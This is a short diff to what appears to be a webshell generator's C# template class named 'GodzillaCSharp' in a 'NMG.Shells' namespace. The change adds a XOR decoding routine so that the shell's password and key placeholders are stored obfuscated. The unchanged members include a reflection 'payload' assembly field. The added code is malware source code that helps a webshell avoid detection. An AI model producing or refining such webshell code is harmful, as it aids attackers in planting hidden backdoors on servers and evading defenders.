@@ -1,4 +1,4 @@
-﻿namespace NMG.Shells;
+namespace NMG.Shells;
 
 public static class GodzillaCSharp
 {
@@ -51,8 +51,14 @@ public static class GodzillaCSharp
         """;
 
     public const string MembersBlock = """
-        public string password = {{PASSWORD}};
-        public string key = {{KEY}};
+        internal static string XD(byte[] d, byte k)
+        {
+            byte[] r = new byte[d.Length];
+            for (int i = 0; i < d.Length; i++) { r[i] = (byte)(d[i] ^ k); }
+            return System.Text.Encoding.UTF8.GetString(r);
+        }
+        public string password = XD({{PASSWORD_ENC}}, {{XOR_KEY}});
+        public string key = XD({{KEY_ENC}}, {{XOR_KEY}});
         private System.Reflection.Assembly payload;
         private System.Random rd = new System.Random();
         public static bool load = false;
